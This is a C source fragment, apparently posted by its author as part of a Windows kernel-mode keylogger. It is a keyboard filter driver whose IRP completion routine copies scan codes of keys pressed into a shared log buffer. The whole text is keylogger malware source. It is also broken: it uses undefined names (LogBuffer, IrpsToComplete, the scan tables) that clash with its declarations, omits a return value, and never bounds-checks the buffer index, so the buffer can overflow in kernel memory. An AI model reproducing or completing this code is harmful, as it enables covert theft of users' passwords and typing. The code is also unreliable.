// Small portion of my KM keylogger with Handler ( to pass in a routine )

#include <ntddk.h>
#include <Ntddkbd.h>

typedef struct _OUT_BUFFER {
	CHAR output[256];
	INT index;
	KSPIN_LOCK BufferLock;
} OUT_BUFFER,*POUT_BUFFER;

PDEVICE_OBJECT NextLowerDriverDeviceObject;
POUT_BUFFER    pLogBufferOutput;
UINT           CompleteIrps;


NTSTATUS KeyloggerCompletion(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context)
{
	PKEYBOARD_INPUT_DATA pKeyInputData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
	UINT InputCountInfo                = Irp->IoStatus.Information / sizeof( KEYBOARD_INPUT_DATA );
        KIRQL kIrqlSil                     = KfAcquireSpinLock( &LogBuffer->BufferLock ); // shared buffer stucture lock
  
	UINT i, j;
	CompleteIrps--;
  
	for ( i = 0 ; i < InputCountInfo ; i++ )
	{	
	  if ( ! ( pKeyInputData[ i ].Flags & 1 ) )
	  {
	    for ( j = 0 ; j < 27 ; j++ ) 
	    {
	      if ( UpperScan[j] == pKeyInputData[ i ].MakeCode )
	      {
	          pLogBufferOutput->output[ pLogBufferOutput->index++ ] = UpperChar[j];
		  break;
	      }
	    }
	  }
	}
	
	KfReleaseSpinLock( &pLogBufferOutput->BufferLock, kIrqlSil );
  
	if ( Irp->PendingReturned ) IoMarkIrpPending( Irp );
}



NTSTATUS KeyloggerHandler(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	IrpsToComplete++;
	IoCopyCurrentIrpStackLocationToNext( Irp );
	IoSetCompletionRoutine( Irp, KeyloggerCompletion, NULL, TRUE, FALSE, FALSE );
  
	return IoCallDriver( NextLowerDriverDeviceObject, Irp );
}
